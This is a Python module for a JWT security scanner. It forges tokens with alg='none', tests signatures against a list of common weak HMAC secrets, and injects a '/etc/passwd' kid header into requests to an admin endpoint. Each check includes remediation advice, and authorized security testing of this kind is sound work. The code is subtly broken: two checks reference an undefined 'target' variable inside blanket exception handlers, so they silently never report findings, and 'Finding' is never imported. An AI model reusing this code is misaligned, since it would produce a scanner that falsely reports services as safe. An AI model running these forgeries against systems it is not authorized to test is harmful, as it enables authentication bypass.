"""
JWT security scanner.
Tests:
- None algorithm (alg: none)
- Weak HS256 secret (common secrets)
- Kid header injection / path traversal
- Expired token acceptance
"""
from __future__ import annotations

import base64
import json
from typing import Any

from core.base_module import BaseModule
from core.result import Severity


class JWTScanner(BaseModule):
    name = "jwt"
    description = "JSON Web Token weakness detection"
    supported_vectors = ["auth_bypass"]

    COMMON_SECRETS = [
        "secret", "password", "123456", "jwt", "key", "admin", "test",
        "your-256-bit-secret", "supersecret", "changeme", "default",
        "mysecret", "appsecret", "devsecret", "production", "prod",
    ]

    async def run(self, target: str, **kwargs: Any) -> list[Finding]:
        self._current_target = target
        endpoints = kwargs.get("endpoints", ["/api/login", "/auth/login"])
        for endpoint in endpoints:
            url = target.rstrip("/") + endpoint
            await self._check_none_alg(url)
            await self._check_weak_secret(url)
            await self._check_kid_injection(url)
        return self.findings

    async def _check_none_alg(self, url: str) -> None:
        """Try to login and see if alg=none is accepted."""
        # We need a valid token first — if auth_bearer is set, modify it
        if not self.config.auth_bearer:
            return
        parts = self.config.auth_bearer.split(".")
        if len(parts) != 3:
            return
        header = json.loads(self._b64_decode(parts[0]))
        header["alg"] = "none"
        new_header = self._b64_encode(json.dumps(header))
        forged = f"{new_header}.{parts[1]}."

        try:
            resp = await self.client.get(
                target.rstrip("/") + "/api/admin/dashboard",  # privileged path
                headers={"Authorization": f"Bearer {forged}"},
            )
            if resp.status_code == 200:
                self.add_finding(
                    vector="auth_bypass",
                    severity="critical",
                    title="JWT accepts 'none' algorithm",
                    description="The server accepted a JWT with alg='none', allowing token forgery without a secret.",
                    confidence=95,
                    evidence=[self.client.build_evidence(resp.request, resp)],
                    remediation="Reject tokens with alg='none'. Use a strict allow-list of permitted algorithms.",
                )
        except Exception:
            pass

    async def _check_weak_secret(self, url: str) -> None:
        import hmac
        import hashlib

        if not self.config.auth_bearer:
            return
        parts = self.config.auth_bearer.split(".")
        if len(parts) != 3:
            return

        for secret in self.COMMON_SECRETS:
            msg = f"{parts[0]}.{parts[1]}".encode()
            sig = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), msg, hashlib.sha256).digest()
            ).decode().rstrip("=")
            if sig == parts[2]:
                self.add_finding(
                    vector="auth_bypass",
                    severity="critical",
                    title=f"JWT signed with weak secret: '{secret}'",
                    description="The JWT HMAC signature matches a common weak secret, allowing anyone to forge tokens.",
                    confidence=100,
                    evidence=[],
                    remediation="Use a 256+ bit cryptographically random secret. Rotate keys periodically. Consider RS256 for asymmetric signing.",
                )
                return

    async def _check_kid_injection(self, url: str) -> None:
        """Test Kid header path traversal."""
        if not self.config.auth_bearer:
            return
        parts = self.config.auth_bearer.split(".")
        if len(parts) != 3:
            return
        header = json.loads(self._b64_decode(parts[0]))
        header["kid"] = "/etc/passwd"
        new_header = self._b64_encode(json.dumps(header))
        forged = f"{new_header}.{parts[1]}.{parts[2]}"

        try:
            resp = await self.client.get(
                target.rstrip("/") + "/api/admin/dashboard",
                headers={"Authorization": f"Bearer {forged}"},
            )
            if any(x in resp.text.lower() for x in ["root:", "error", "exception"]):
                self.add_finding(
                    vector="auth_bypass",
                    severity="medium",
                    title="JWT Kid header path traversal",
                    description="Kid header accepted a file path, potentially allowing file read via JWT verification.",
                    confidence=50,
                    evidence=[self.client.build_evidence(resp.request, resp)],
                    remediation="Validate Kid against a known key ID allow-list. Do not use Kid to construct filesystem paths.",
                )
        except Exception:
            pass

    def _b64_decode(self, data: str) -> str:
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data).decode()

    def _b64_encode(self, data: str) -> str:
        return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")
